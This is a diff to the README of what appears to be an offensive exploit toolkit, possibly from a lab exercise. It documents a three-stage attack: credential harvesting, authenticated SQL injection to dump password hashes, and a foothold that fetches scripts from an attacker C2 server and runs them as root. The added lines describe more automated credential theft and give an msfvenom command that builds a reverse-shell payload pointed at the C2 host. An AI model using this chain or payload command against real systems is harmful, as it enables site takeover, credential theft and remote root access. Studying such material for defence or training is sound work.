@@ -26,6 +26,10 @@ The [golang program](stage1.go) in this repository:
 
 The attacker can then use these credentials to either login to the site and proceed with the attack, or pass the credentials into another tool to automate the takeover of the target.
 
+*Note: 
+After an update to the code, the golang program now also conducts the SQLi attack and pulls down the credentials from the database after login.
+
+
 ### Stage 2: SQLi Injector
 
 To leverage the credentials obtained in the first attack a tool was written in Python3. This tool extracts users and password hashes from the database using a SQLi vulnerability present in the dashboard of an authenticated user. 
@@ -49,7 +53,7 @@ Command To Execute Stage 2:
 ```
 
 *Note
-The [script](exploit.py) for stage 2 is alsoused to execute stage 3, becuase stage 3 uses some of the same process as stage 2.*
+The [script](exploit.py) for stage 2 is alsoused to execute stage 3, becuase stage 3 uses some of the same process as stage 2. Additionally, this python script now also automatically pulls the credentials required for "stage 2" from the website upon execution of stage 2. To conduct Stage 1 and Stage 2, the user can execute **either** the python script with "stage 2" specified as the process or run the golang program above.*
 
 ### Stage 3: Foothold
 
@@ -64,3 +68,9 @@ Command To Execute Stage 3:
 If desired, the user can also specify `-s` to specify the name of the script the exploit will pull down from the C2 server. The default script name is `rooter.sh`.
 
 *Note The `-b` option builds a pre-witten script that will pull down a file called `mshell` from the attacker's C2 server and uses the privilege escalation vector to have it run as root.*
+
+*MSFVenom Payload Generation Command:*
+
+```bash
+msfvenom -p <PAYLOAD> LHOST=<C2IP> LPORT=<C2PORT> -o mshell -f elf
+```
